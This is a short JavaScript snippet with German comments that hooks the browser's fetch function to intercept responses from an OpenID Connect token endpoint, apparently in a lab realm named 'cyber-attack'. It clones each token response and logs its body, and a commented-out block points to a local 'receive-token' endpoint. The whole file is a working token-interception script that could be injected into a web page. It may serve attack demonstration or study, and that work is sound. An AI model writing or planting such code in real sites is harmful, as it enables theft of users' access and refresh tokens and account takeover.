(function() {
    const originalFetch = window.fetch;

    // Alle HTTP-Request abfangen und überschreiben
    window.fetch = function(...args) {
        // Man in the middle für Token Endpoint
        if (args[0].href.includes('/realms/cyber-attack/protocol/openid-connect/token')) {
            return originalFetch.apply(this, args).then(response => {
                const clonedResponse = response.clone();

                clonedResponse.json().then(body => {
                    console.log('Gelesener Body der Response:', body);
                }).catch(error => {
                    console.error('Fehler beim Lesen des Response-Body:', error);
                });

                return response;
            });
        } else {
            return originalFetch.apply(this, args);
        }
    };
})();

// fetch('http://localhost:9999/rest/receive-token')
//     .then(response => {
//         if (!response.ok) {
//             throw new Error('Netzwerkantwort war nicht ok');
//         }
//         return response.json();
//     })
//     .then(data => {
//         console.log(data);
//     })
//     .catch(error => {
//         console.error('Fehler beim Fetchen:', error);
//     });
